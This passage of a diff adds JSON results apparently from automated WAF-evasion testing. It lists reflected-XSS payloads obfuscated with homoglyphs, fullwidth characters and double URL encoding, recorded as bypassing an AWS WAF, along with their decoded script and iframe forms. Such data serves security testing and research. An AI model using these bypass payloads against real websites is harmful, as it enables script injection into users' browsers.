+        "payload": "％２５３СѕсＲіＰＴ％２５３ＥＡⅼеrt％２５２８１％２５２９％２５３Ｃ＆＃４７；ѕсＲＩpt％２５３Ｅ",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scRiPT>Alert(1)</scRIpt>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>Alert(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "JaVAS/* */cRIPT:CoNFIRM(42)&Lqop=SDVG",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "JaVAS/* */cRIPT:CoNFIRM(42)&Lqop=SDVG",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CMEtER%252832%2529%253EWEcome%2520To%2520CH gesetz! %253Ch1%253EHTML%253C&#47;H1%253EWeib%2526WkEk=fuITu",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<MEtER(32)>WEcome To CH gesetz! <h1>HTML</H1>Weib&WkEk=fuITu",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "meter(32)",
+                        "html": "<meter(32)>WEcome To CH gesetz! <h1>HTML</h1>Weib&amp;WkEk=fuITu</meter(32)>"
+                    },
+                    {
+                        "tag_name": "h1",
+                        "html": "<h1>HTML</h1>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сѕСRІpT％２５３еАⅬЕRT％２５２８１％２５２９％２５３с／ЅСRІpT％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sCRIpT>ALERT(1)</SCRIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALERT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СІFRАmе％２５２０ЅRс％２５３DJаVАѕСrіpT％２５３ААⅬЕrt％２５２８１％２５２９％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRAme SRc=JaVAsCripT:ALErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JaVAsCripT:ALErt(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    }
+]
